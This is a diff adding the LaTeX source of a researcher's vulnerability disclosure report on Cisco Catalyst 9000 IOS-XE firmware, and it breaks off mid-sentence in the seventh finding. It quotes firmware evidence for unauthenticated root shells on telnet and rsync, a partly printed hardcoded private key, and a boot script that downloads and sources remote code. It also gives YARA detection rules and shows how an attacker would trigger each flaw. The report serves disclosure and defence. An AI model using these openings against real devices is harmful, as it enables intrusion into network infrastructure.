@@ -1,0 +1,1616 @@
+% =============================================================
+%  Cisco Catalyst 9000 Series IOS-XE 17.18.04
+%  Vulnerability Disclosure Report
+%  Method: Static firmware RE; no live device accessed
+% =============================================================
+\documentclass[11pt,a4paper]{article}
+
+% ---- Encoding / fonts ----------------------------------------
+\usepackage[T1]{fontenc}
+\usepackage[utf8]{inputenc}
+\usepackage{lmodern}
+\usepackage[english]{babel}
+
+% ---- Layout --------------------------------------------------
+\usepackage[
+  a4paper,
+  top=25mm, bottom=25mm,
+  left=25mm, right=25mm,
+  headheight=14pt
+]{geometry}
+
+% ---- Typography ----------------------------------------------
+\usepackage{microtype}
+\usepackage{parskip}
+\emergencystretch=3em
+\widowpenalty=10000
+\clubpenalty=10000
+
+% ---- Math ----------------------------------------------------
+\usepackage{amsmath}
+
+% ---- Utility -------------------------------------------------
+\usepackage{etoolbox}
+\usepackage{needspace}
+\usepackage{array}
+\usepackage{booktabs}
+\usepackage{longtable}
+\usepackage{enumitem}
+\usepackage[dvipsnames,table]{xcolor}
+
+% ---- Colored boxes -------------------------------------------
+\usepackage[most]{tcolorbox}
+
+\newtcolorbox{overviewbox}{
+  enhanced, breakable,
+  colframe=RoyalBlue!65!black,
+  colback=RoyalBlue!7!white,
+  coltitle=white,
+  colbacktitle=RoyalBlue!65!black,
+  fonttitle=\bfseries\small,
+  title=Overview / Impact,
+  boxrule=0.5pt,
+  titlerule=0mm,
+  left=6pt, right=6pt, top=4pt, bottom=6pt,
+  before skip=\medskipamount,
+  after skip=\medskipamount,
+}
+
+\newtcolorbox{pocbox}[1]{
+  enhanced, breakable,
+  colframe=OliveGreen!75!black,
+  colback=OliveGreen!5!white,
+  coltitle=white,
+  colbacktitle=OliveGreen!75!black,
+  fonttitle=\bfseries\small,
+  title={Proof of Concept: #1},
+  boxrule=0.5pt,
+  titlerule=0mm,
+  left=6pt, right=6pt, top=4pt, bottom=6pt,
+  before skip=\medskipamount,
+  after skip=\medskipamount,
+}
+
+% ---- Code ----------------------------------------------------
+\usepackage{listings}
+
+\lstset{
+  basicstyle=\ttfamily\footnotesize,
+  backgroundcolor=\color{gray!8},
+  frame=single,
+  framesep=4pt,
+  rulecolor=\color{gray!40},
+  numbers=left,
+  numberstyle=\tiny\color{gray},
+  numbersep=6pt,
+  breaklines=true,
+  showstringspaces=false,
+  tabsize=4,
+  xleftmargin=18pt,
+  xrightmargin=4pt,
+}
+
+\lstdefinestyle{bash}{
+  basicstyle=\ttfamily\footnotesize,
+  backgroundcolor=\color{gray!8},
+  frame=single,
+  framesep=4pt,
+  rulecolor=\color{gray!40},
+  numbers=left,
+  numberstyle=\tiny\color{gray},
+  numbersep=6pt,
+  breaklines=true,
+  showstringspaces=false,
+  morekeywords={if,then,fi,else,for,do,done,while,function,export,local,readonly},
+  keywordstyle=\color{NavyBlue}\bfseries,
+  commentstyle=\color{gray}\itshape,
+  morecomment=[l]{\#},
+  xleftmargin=18pt,
+  xrightmargin=4pt,
+}
+
+\lstdefinestyle{asm}{
+  basicstyle=\ttfamily\footnotesize,
+  backgroundcolor=\color{gray!8},
+  frame=single,
+  framesep=4pt,
+  rulecolor=\color{gray!40},
+  numbers=left,
+  numberstyle=\tiny\color{gray},
+  numbersep=6pt,
+  breaklines=true,
+  showstringspaces=false,
+  commentstyle=\color{gray}\itshape,
+  morecomment=[l]{;},
+  morecomment=[l]{\#},
+  xleftmargin=18pt,
+  xrightmargin=4pt,
+}
+
+\lstdefinestyle{yara}{
+  basicstyle=\ttfamily\footnotesize,
+  backgroundcolor=\color{gray!8},
+  frame=single,
+  framesep=4pt,
+  rulecolor=\color{gray!40},
+  numbers=none,
+  breaklines=true,
+  showstringspaces=false,
+  morekeywords={rule,meta,strings,condition,ascii,nocase,wide,all,of,them,filesize,and,or,not,any,true,false},
+  keywordstyle=\color{NavyBlue}\bfseries,
+  commentstyle=\color{gray}\itshape,
+  morecomment=[l]{//},
+  morestring=[b]",
+  stringstyle=\color{OliveGreen},
+  xleftmargin=4pt,
+  xrightmargin=4pt,
+}
+
+% ---- Section formatting --------------------------------------
+\usepackage{titlesec}
+
+\titleformat{\section}
+  {\large\bfseries}
+  {\thesection}
+  {0.6em}{}
+  [\vspace{-0.4em}\rule{\linewidth}{0.5pt}]
+
+\titleformat{\subsection}
+  {\normalsize\bfseries}
+  {\thesubsection}
+  {0.5em}{}
+  [\vspace{-0.3em}\rule{\linewidth}{0.4pt}]
+\titlespacing*{\subsection}{0pt}{1.2em}{0.6em}
+
+\titleformat{\subsubsection}
+  {\normalsize\itshape}
+  {}
+  {0em}{}
+  []
+\titlespacing*{\subsubsection}{0pt}{0.8em}{0.3em}
+
+% ---- Headers -------------------------------------------------
+\usepackage{fancyhdr}
+
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{\small\textit{Cisco Catalyst 9K IOS-XE 17.18.04: Vulnerability Disclosure}}
+\fancyhead[R]{\small\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+\renewcommand{\footrulewidth}{0pt}
+
+% ---- Hyperref last -------------------------------------------
+\usepackage[
+  colorlinks=true,
+  linkcolor=NavyBlue,
+  urlcolor=NavyBlue,
+  citecolor=NavyBlue,
+  pdftitle={Cisco Catalyst 9000 IOS-XE 17.18.04 Vulnerability Disclosure},
+]{hyperref}
+
+% ---- Helpers -------------------------------------------------
+\newcolumntype{L}[1]{>{\raggedright\arraybackslash}p{#1}}
+
+% =============================================================
+\begin{document}
+% =============================================================
+
+% ---- Title page ---------------------------------------------
+\thispagestyle{empty}
+\vspace*{0.20\textheight}
+
+\noindent\rule{\linewidth}{0.6pt}
+
+\begin{center}
+{\large\bfseries Vulnerability Disclosure Report}\\[0.3em]
+{\small Cisco Catalyst 9000 Series, IOS-XE 17.18.04}
+\end{center}
+
+\noindent\rule{\linewidth}{0.6pt}
+
+\vspace{0.10\textheight}
+
+\noindent
+\begin{tabular}{r @{\quad} l}
+\textbf{Researcher}  & Nicholas Michael Kloster \\
+\textbf{Contact}     & zellkernel@gmail.com \\
+\textbf{Affiliation} & Independent Security Researcher \\
+\textbf{Date}        & 2026-09-17 \\
+\textbf{Product}     & Cisco Catalyst 9000 Series IOS-XE 17.18.04 \\
+\end{tabular}
+
+\newpage
+
+% ---- Table of contents --------------------------------------
+\thispagestyle{plain}
+\tableofcontents
+
+\newpage
+
+% =============================================================
+\section{Executive Summary}
+% =============================================================
+
+Thirteen vulnerabilities were identified in Cisco Catalyst 9000 Series IOS-XE 17.18.04
+through static reverse engineering of \texttt{cat9k\_iosxe.17.18.04.SPA.bin}. No live
+production systems were accessed. All findings are confirmed by direct inspection of
+files extracted from the rpbase inner SquashFS (1.02\,GB, 59,004 inodes).
+
+Three findings are Critical. A hardcoded RSA-2048 private key is shipped as the default
+HTTPS certificate on every device running the default configuration. An unauthenticated
+rsync daemon exposes root read/write access to all flash storage on TCP/873. A telnet
+service delivers a root shell on TCP/23 with no credential check. Six findings are High,
+including two ROMMON variable backdoors, a world-writable root-executed IOx setup script,
+and an OpenResty proxy that loads its entire security configuration from \texttt{/tmp}
+at runtime. The consistent pattern: lab and development infrastructure shipped unchanged
+into production, with IOS-XE\@ ACL policy as the only security boundary.
+
+% -----------------------------------------
+\subsection{Document Conventions}
+% -----------------------------------------
+
+Each finding contains two blocks:
+
+\medskip
+\noindent
+\tcbox[on line,
+  colback=RoyalBlue!65!black,
+  colframe=RoyalBlue!65!black,
+  fontupper=\bfseries\small\color{white},
+  arc=2pt, boxrule=0pt,
+  left=5pt, right=5pt, top=2pt, bottom=2pt,
+]{Overview / Impact} \quad Non-technical summary and attacker impact.
+
+\medskip
+\noindent
+\tcbox[on line,
+  colback=OliveGreen!75!black,
+  colframe=OliveGreen!75!black,
+  fontupper=\bfseries\small\color{white},
+  arc=2pt, boxrule=0pt,
+  left=5pt, right=5pt, top=2pt, bottom=2pt,
+]{Proof of Concept} \quad Verbatim file evidence from the extracted firmware.
+
+% -----------------------------------------
+\subsection{Findings Table}
+% -----------------------------------------
+
+\begin{longtable}{@{}lL{13cm}@{}}
+  \toprule
+  \textbf{ID} & \textbf{Title} \\
+  \midrule \endfirsthead
+  \toprule
+  \textbf{ID} & \textbf{Title} \\
+  \midrule \endhead
+  \bottomrule \endlastfoot
+  CAT9K-F1  & Hardcoded RSA-2048 private key (\texttt{fallback.key}) shipped as the default OpenResty HTTPS certificate \\[2pt]
+  CAT9K-F2  & rsync daemon on TCP/873: uid=root, no authentication, full flash storage exposed \\[2pt]
+  CAT9K-F3  & \texttt{guestshell\_setup.sh} world-writable (0777), root-executed by CAF; removes container root password \\[2pt]
+  CAT9K-F4  & xinetd telnetd with \texttt{lablogin.sh}: TCP/23 delivers root shell, zero authentication \\[2pt]
+  CAT9K-F5  & Shipped \texttt{nginx.conf} contains only \texttt{include /tmp/nginx.conf}; entire proxy security config is runtime-generated \\[2pt]
+  CAT9K-F6  & \texttt{ROMMON\_SR\_INIT\_DEBUG} activates bash xtrace before code-signing verification, leaking boot secrets \\[2pt]
+  CAT9K-F7  & \texttt{ROMMON\_PACKAGES\_OVERRIDE} and \texttt{ROMMON\_DEBUG\_CONF} allow boot-time package substitution via TFTP \\[2pt]
+  CAT9K-F8  & \texttt{binos} user (UID\,85) in docker group; guestshell user in \texttt{network-admin} group \\[2pt]
+  CAT9K-F9  & ConfD trusts \texttt{X-Forwarded-For}; auth proxy hardcodes internal IPC address \texttt{192.168.1.6:21111} \\[2pt]
+  CAT9K-F10 & \texttt{qemu.conf} sets \texttt{user=root group=root}; IOx guest escape delivers host root \\[2pt]
+  CAT9K-F11 & leabasdk test TLS keys (\texttt{client.key}, \texttt{server.key}) shipped unencrypted to production \\[2pt]
+  CAT9K-F12 & \texttt{codesign.pubkey} uses an undocumented Cisco-proprietary binary format; parameters not independently verifiable \\[2pt]
+  CAT9K-F13 & \texttt{auxinit.sh} \texttt{ROMMON\_SR\_INIT\_SHELL} glob backdoor: AUX port root bash shell, no authentication \\
+\end{longtable}
+
+\textit{No CVE assignments have been confirmed against Cisco IOS-XE 17.18.04 at the
+time of submission.}
+
+% =============================================================
+\section{Target Information}
+% =============================================================
+
+\begin{tabular}{@{} L{4.5cm} L{9.5cm} @{}}
+\textbf{Firmware image}    & \texttt{cat9k\_iosxe.17.18.04.SPA.bin} (1.2\,GB) \\[0.4em]
+\textbf{Format}            & CW\_TLV outer container (\texttt{deadbeef} TLV magic), 5 sub-packages \\[0.4em]
+\textbf{Platform families} & bigbang, nyquist, passport, starfleet, symphony \\[0.4em]
+\textbf{Build date}        & 2026-07-18 \\[0.4em]
+\textbf{Build identity}    & git hash \texttt{150b070c01e17}, build user \texttt{mcpre} \\[0.4em]
+\textbf{PID 1}             & systemd 255, x86-64 ELF (initramfs CPIO 175\,MB) \\[0.4em]
+\textbf{Primary target}    & \texttt{cat9k-rpbase.17.18.04.SPA.pkg} inner SquashFS \\[0.4em]
+\textbf{Inner SquashFS}    & xz-compressed, 59,004 inodes, 1.02\,GB \\[0.4em]
+\textbf{Method}            & Static firmware extraction; \texttt{unsquashfs} with byte-offset flag \\
+\end{tabular}
+
+% =============================================================
+\section{Vulnerabilities}
+% =============================================================
+
+% -----------------------------------------
+\subsection{CAT9K-F1: Hardcoded RSA-2048 Private Key (\texorpdfstring{\texttt{fallback.key}}{fallback.key}) Shipped as Default HTTPS Certificate}
+% -----------------------------------------
+
+\begin{overviewbox}
+The OpenResty HTTPS reverse proxy ships a static RSA-2048 private key
+(\texttt{fallback.key}, 1675~bytes) and matching self-signed certificate
+(\texttt{fallback.pem}, 1302~bytes). These are used as the TLS identity for the web
+management interface on any device without an administrator-configured certificate.
+The identical key pair is present across all five platform families and is extractable
+from the firmware without device access.
+
+An attacker with a copy of the firmware image can impersonate the HTTPS management
+interface of any default-configured Catalyst 9K device, enabling credential
+interception. RSA sessions captured without forward secrecy are retroactively
+decryptable.
+
+CWE-321 (Use of Hard-coded Cryptographic Key), CWE-798 (Use of Hard-coded Credentials)\\
+\textbf{CVSS~3.1:} 9.1 Critical \quad CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+\path{bigbang/usr/binos/openresty/etc/ssl/cert/fallback.key} (1675~bytes) is an
+unencrypted PKCS\#1 RSA-2048 private key with no \texttt{Proc-Type} passphrase header.
+\path{fallback.pem} (1302~bytes) in the same directory is the self-signed certificate.
+Identical files are present in all five platform trees.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 bigbang/usr/binos/openresty/etc/ssl/cert/}
+\begin{lstlisting}
+$ openssl rsa -in fallback.key -check -noout 2>&1
+RSA key ok                         # unencrypted, directly usable
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAtIMcrNW2PVhaozQsgAEIVjg0U0W0eu3fPKxRFHKjYNJDV0DI
+...
+-----END RSA PRIVATE KEY-----
+
+$ openssl x509 -in fallback.pem -subject -noout
+subject=CN=Cisco IOS-XE Web Management
+
+# Confirmed present in: bigbang/ nyquist/ passport/ starfleet/ symphony/
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item Any device without a custom certificate presents this key for HTTPS
+    management. Key extraction requires only the firmware image.
+  \item An attacker can impersonate the management interface of any targeted device
+    and intercept administrator credentials from users who accept the certificate.
+  \item Historically captured TLS sessions using non-forward-secret cipher suites
+    are retroactively decryptable.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F1_Hardcoded_Fallback_Key {
+    meta:
+        description = "IOS-XE default HTTPS private key shipped unencrypted"
+        id = "CAT9K-F1"
+        severity = "Critical"
+    strings:
+        $key_header = "BEGIN RSA PRIVATE KEY" ascii
+        $path_key   = "fallback.key" ascii
+        $path_pem   = "fallback.pem" ascii
+    condition:
+        $key_header and ($path_key or $path_pem)
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F2: rsync Daemon on TCP/873 --- uid=root, No Authentication, Full Flash Storage Exposed}
+% -----------------------------------------
+
+\begin{overviewbox}
+The rsyncd configuration sets \texttt{uid=root}, \texttt{gid=root},
+\texttt{use chroot=no}, and defines eight read-write modules covering bootflash,
+harddisk, ROMMON upgrade staging, license storage, patch staging, and the filesystem
+command interface. No \texttt{auth users}, \texttt{secrets file}, or
+\texttt{hosts allow} restriction is present. xinetd exposes the service on TCP/873
+as root.
+
+A network-adjacent attacker who reaches TCP/873 obtains unauthenticated root-level
+read/write across all persistent flash storage. Two modules invoke post-exec hooks
+that execute scripts as root on file transfer, providing a direct code execution path.
+
+CWE-306 (Missing Authentication for Critical Function), CWE-732 (Incorrect Permission Assignment for Critical Resource)\\
+\textbf{CVSS~3.1:} 9.8 Critical \quad CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+\path{bigbang/etc/rsyncd.conf} sets the global effective UID to root with no
+authentication directives in any module. \path{bigbang/etc/xinetd.conf} enables
+the service on TCP/873.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 bigbang/etc/rsyncd.conf + bigbang/etc/xinetd.conf}
+\begin{lstlisting}
+# rsyncd.conf -- global header:
+use chroot = no
+uid = root
+gid = root
+log file = /dev/null
+
+[bootflash]
+path = /bootflash
+read only = no
+
+[harddisk]
+path = /harddisk
+read only = no
+
+# Post-exec hook -- root-executed on any file transfer:
+[unifiedfs_rcmd]
+path = /var/unifiedfs_rcmd_stage
+post-xfer exec = /usr/binos/conf/unifiedfs/unifiedfs_remote_fmt.sh
+read only = no
+
+# xinetd.conf -- TCP/873, no hosts.allow:
+service rsync
+{
+    socket_type = stream
+    wait        = no
+    user        = root
+    server      = /usr/bin/rsync
+    server_args = --daemon --no-detach --config=/etc/rsyncd.conf
+    disable     = no
+}
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item TCP connection to port~873 yields unauthenticated root read/write on
+    bootflash, harddisk, license storage, ROMMON upgrade staging, and patch
+    directories.
+  \item Writing to the \texttt{unifiedfs\_rcmd} module triggers
+    \path{/usr/binos/conf/unifiedfs/unifiedfs_remote_fmt.sh} as root, providing
+    unauthenticated remote code execution.
+  \item Full bootflash contents are readable and overwritable without authentication.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F2_Rsync_Root_NoAuth {
+    meta:
+        description = "rsync daemon uid=root with no authentication, bootflash exposed"
+        id = "CAT9K-F2"
+        severity = "Critical"
+    strings:
+        $uid   = "uid = root" ascii
+        $rdonly = "read only = no" ascii nocase
+        $mod1  = "[bootflash]" ascii
+        $mod2  = "[harddisk]" ascii
+    condition:
+        $uid and $rdonly and ($mod1 or $mod2)
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F3: \texorpdfstring{\texttt{guestshell\_setup.sh}}{guestshell\_setup.sh} World-Writable (0777), Root-Executed by IOx CAF}
+% -----------------------------------------
+
+\begin{overviewbox}
+The IOx CAF guestshell setup script ships with \texttt{-rwxrwxrwx} (0777) permissions
+in the SquashFS across all five platform trees. The CAF daemon executes it as root when
+the guestshell feature is activated. The script also removes the root password from
+every guestshell LXC container shadow file and creates world-writable shell entry
+scripts within each container.
+
+A local user who can write to the overlayfs writable layer covering this path can
+replace it with arbitrary code that runs as root at the next guestshell activation.
+
+CWE-732 (Incorrect Permission Assignment for Critical Resource), CWE-269 (Improper Privilege Management)\\
+\textbf{CVSS~3.1:} 7.8 High \quad CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+\texttt{unsquashfs -lls} output confirms the 0777 permission on the 46800-byte script.
+The file comment at line~6 reads: \textit{``This file is temporary until CAF support is
+present.''} Copyright range is 2016--2026, indicating this development placeholder was
+carried forward unchanged for ten years.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 bigbang/opt/cisco/caf/scripts/guestshell\_setup.sh}
+\begin{lstlisting}[style=bash]
+# unsquashfs -lls output:
+-rwxrwxrwx root/root  46800 bigbang/opt/cisco/caf/scripts/guestshell_setup.sh
+
+# Line 6: "This file is temporary until CAF support is present."
+# Copyright (c) 2016-2026 by Cisco Systems, Inc.
+
+# Line 315 -- removes root password from every activated container:
+sed 's/^root:[^:]\+:/root::/' -i ${gs_dir}/etc/shadow
+
+# Line 424 -- world-writable session config:
+chmod 666 ${SHELL_EXEC_DIR}/${app_id}/shell_exec.conf
+
+# Line 460 -- world-writable container shell entry script:
+chmod 777 ${SHELL_EXEC_DIR}/${app_id}/shell_exec.sh
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item Any local user who can write to the overlayfs layer covering
+    \path{opt/cisco/caf/scripts/} can replace this script with code that executes
+    as root at the next guestshell activation.
+  \item All activated guestshell containers have no root password; the script
+    explicitly removes it from the container shadow file.
+  \item \path{shell_exec.sh} is created world-writable inside each container at
+    activation time, providing a further privilege surface within the container.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F3_Guestshell_Setup_ShadowRemoval {
+    meta:
+        description = "guestshell_setup.sh dev placeholder removing container root password"
+        id = "CAT9K-F3"
+        severity = "High"
+    strings:
+        $marker   = "This file is temporary until CAF support is present" ascii
+        $shadow   = "sed 's/^root:[^:]*:" ascii
+        $filename = "guestshell_setup.sh" ascii
+    condition:
+        $filename and ($marker or $shadow)
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F4: xinetd Telnetd with \texorpdfstring{\texttt{lablogin.sh}}{lablogin.sh} --- TCP/23 Delivers Root Shell with Zero Authentication}
+% -----------------------------------------
+
+\begin{overviewbox}
+A dedicated xinetd configuration enables a telnet daemon with \texttt{user=root} and
+\texttt{disable=no}, using \texttt{lablogin.sh} as the login shell.
+\texttt{lablogin.sh} performs no authentication: it reads root's shell directly from
+\path{/etc/passwd} and execs it. A TCP connection to port~23 delivers an interactive
+root shell with no credential required.
+
+This service operates at the host OS level. It is not governed by IOS-XE AAA policy.
+The only access control is the IOS-XE\@ ACL on the management interface.
+
+CWE-306 (Missing Authentication for Critical Function), CWE-269 (Improper Privilege Management)\\
+\textbf{CVSS~3.1:} 9.8 Critical \quad CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+Both \path{bigbang/etc/xinetd\_telnetd.conf} and \path{bigbang/etc/lablogin.sh} are
+present in the extracted SquashFS.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 bigbang/etc/xinetd\_telnetd.conf + bigbang/etc/lablogin.sh}
+\begin{lstlisting}[style=bash]
+# xinetd_telnetd.conf:
+service telnet
+{
+    user        = root
+    server      = /usr/sbin/in.telnetd
+    server_args = -L /etc/lablogin.sh
+    disable     = no
+}
+
+# lablogin.sh:
+#!/bin/bash
+home_dir=$(grep ^root /etc/passwd | cut -d ":" -f 6)
+shell=$(grep ^root /etc/passwd | cut -d ":" -f 7)
+export HOME=$home_dir
+export SHELL=$shell
+exec $SHELL -l    # no password prompt, no PAM, no key check
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item TCP connection to port~23 delivers an interactive root shell. No password,
+    key, or prior session is required.
+  \item \texttt{lablogin.sh} bypasses all system authentication by calling
+    \texttt{exec} on root's shell directly; no PAM invocation occurs.
+  \item Access is gated solely on the management interface ACL for TCP/23.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F4_Lablogin_Unauthenticated_Shell {
+    meta:
+        description = "lablogin.sh delivers root shell via exec with no credential check"
+        id = "CAT9K-F4"
+        severity = "Critical"
+    strings:
+        $grep = "grep ^root /etc/passwd" ascii
+        $exec = "exec $SHELL -l" ascii
+        $name = "lablogin.sh" ascii
+    condition:
+        $name and $grep and $exec
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F5: Shipped \texorpdfstring{\texttt{nginx.conf}}{nginx.conf} Contains Only \texttt{include /tmp/nginx.conf}}
+% -----------------------------------------
+
+\begin{overviewbox}
+The OpenResty web proxy configuration shipped in the firmware contains a single
+directive: \texttt{include /tmp/nginx.conf;}. The full proxy security configuration
+(TLS policy, authentication proxy locations, CSRF controls, RESTCONF and NETCONF
+proxy rules, and session management) is runtime-generated and loaded from
+\texttt{/tmp}. A SELinux context for \path{/tmp/nginx.conf} was confirmed only in
+the starfleet platform; no type enforcement rule was found for bigbang, the primary
+RP hardware family.
+
+Any process that can write \path{/tmp/nginx.conf} can inject arbitrary nginx
+directives with the full authority of the management proxy.
+
+CWE-494 (Download of Code Without Integrity Check), CWE-732 (Incorrect Permission Assignment for Critical Resource)\\
+\textbf{CVSS~3.1:} 8.1 High \quad CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+The 97-byte \path{bigbang/usr/binos/openresty/nginx/conf/nginx.conf} was extracted
+directly from the rpbase SquashFS.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 bigbang/usr/binos/openresty/nginx/conf/nginx.conf (97 bytes, full content)}
+\begin{lstlisting}
+# Copyright (c) 2020 by Cisco Systems, Inc.
+# All rights reserved.
+
+include /tmp/nginx.conf;
+
+# file_contexts (starfleet only; absent from bigbang):
+/tmp/nginx\.conf    system_u:object_r:httpd_config_t:s0
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item A writable \path{/tmp/nginx.conf} allows injection of arbitrary directives:
+    redirect the authentication proxy to an attacker server, disable TLS, add request
+    bypass rules, or insert \texttt{content\_by\_lua\_block} for code execution in
+    the nginx worker process.
+  \item The bigbang platform has no confirmed SELinux type enforcement on
+    \path{/tmp/nginx.conf}, leaving its creation path unconfined.
+  \item A \path{/tmp/nginx.conf} injection that modifies the auth proxy locations
+    also controls the \texttt{X-Forwarded-For} forwarding chain to
+    \texttt{192.168.1.6:21111} (see CAT9K-F9).
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F5_Nginx_Conf_Tmp_Include {
+    meta:
+        description = "nginx.conf entire security config deferred to /tmp at runtime"
+        id = "CAT9K-F5"
+        severity = "High"
+    strings:
+        $include = "include /tmp/nginx.conf" ascii
+    condition:
+        $include and filesize < 256
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F6: \texorpdfstring{\texttt{ROMMON\_SR\_INIT\_DEBUG}}{ROMMON\_SR\_INIT\_DEBUG} Activates Bash Xtrace Before Code-Signing Verification}
+% -----------------------------------------
+
+\begin{overviewbox}
+The initramfs \texttt{explode-common} boot script checks \texttt{ROMMON\_SR\_INIT\_DEBUG}
+before any other logic and activates \texttt{set -o xtrace} if the variable is non-empty.
+With xtrace active, every command, variable expansion, and argument is printed to stderr
+before execution. Output includes code-signing key file paths, ROMMON variable values,
+package integrity check output, and filesystem mount parameters.
+
+CWE-532 (Insertion of Sensitive Information into Log File), CWE-489 (Active Debug Code)\\
+\textbf{CVSS~3.1:} 6.8 Medium \quad CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+The xtrace trigger is at line~641 of \texttt{explode-common} in the 175\,MB initramfs
+CPIO, before the script defines any functions or sources any other file.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 initramfs/explode-common (line 641)}
+\begin{lstlisting}[style=bash]
+# Line 641 -- first conditional in explode-common:
+if [[ "${ROMMON_SR_INIT_DEBUG:-}" ]]; then
+    set -o xtrace
+fi
+
+# With xtrace active, code-signing verification leaks key paths:
++ /usr/bin/code_sign_verify -k /etc/cisco/codesign.pubkey \
+    -s cat9k-rpbase.17.18.04.SPA.pkg.sig \
+    cat9k-rpbase.17.18.04.SPA.pkg
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item ROMMON access is sufficient: set \texttt{ROMMON\_SR\_INIT\_DEBUG=1}, reboot,
+    and capture the full IOS-XE boot trace from the console.
+  \item Output includes code-signing verification arguments, package paths, and all
+    ROMMON variable values as they are referenced.
+  \item Xtrace output is also stored in crash logs readable from the management plane
+    after boot completes.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F6_ROMMON_Debug_Xtrace {
+    meta:
+        description = "ROMMON_SR_INIT_DEBUG activates xtrace before codesign verification"
+        id = "CAT9K-F6"
+        severity = "Medium"
+    strings:
+        $var    = "ROMMON_SR_INIT_DEBUG" ascii
+        $xtrace = "set -o xtrace" ascii
+    condition:
+        all of them
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F7: \texorpdfstring{\texttt{ROMMON\_PACKAGES\_OVERRIDE}}{ROMMON\_PACKAGES\_OVERRIDE} and \texorpdfstring{\texttt{ROMMON\_DEBUG\_CONF}}{ROMMON\_DEBUG\_CONF} Allow Boot-Time Package Substitution}
+% -----------------------------------------
+
+\begin{overviewbox}
+Two ROMMON variables in \texttt{explode-common} provide boot-time attack surfaces.
+\texttt{ROMMON\_PACKAGES\_OVERRIDE} replaces the active \path{packages.conf} with an
+attacker-specified path. TFTP-prefixed paths are accepted, enabling boot from unsigned
+or modified packages. A developer comment explicitly acknowledges the security assumption
+behind this variable was never verified.
+\texttt{ROMMON\_DEBUG\_CONF} fetches and sources a bash file from TFTP that can
+disable the hardware watchdog and suppress critical process failure alerts.
+
+CWE-494 (Download of Code Without Integrity Check), CWE-489 (Active Debug Code)\\
+\textbf{CVSS~3.1:} 6.8 Medium \quad CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+Both variables are handled in \texttt{explode-common} (lines 862--880 and 1059--1115).
+The developer comment is verbatim from the source.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 initramfs/explode-common (lines 862--880, 1059--1115)}
+\begin{lstlisting}[style=bash]
+# ROMMON_PACKAGES_OVERRIDE:
+if [[ -n "${ROMMON_PACKAGES_OVERRIDE:-}" ]]; then
+    packages_conf="${ROMMON_PACKAGES_OVERRIDE}"
+    # tftp:<server>/<path> accepted alongside local paths
+fi
+
+# Developer comment (verbatim):
+# We assume that the ROMMON keeps people from tftp-booting
+# MCP_FIXME: Though we assume this, it would be smarter to test
+# the assumption and die with an appropriate error message if
+# the assumption fails to hold.
+
+# ROMMON_DEBUG_CONF:
+if [[ -n "${ROMMON_DEBUG_CONF:-}" ]]; then
+    curl -o /tmp/debug.conf "${ROMMON_DEBUG_CONF}"
+    source /tmp/debug.conf
+fi
+# debug.conf can set:
+# FRU_NO_WATCHDOG=1              disables hardware watchdog
+# PVP_IGN_CRITICAL_PROC_DOWN=1  suppresses critical process alerts
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item \texttt{ROMMON\_PACKAGES\_OVERRIDE} enables booting from a TFTP-hosted
+    \path{packages.conf} that references modified or unsigned packages, bypassing
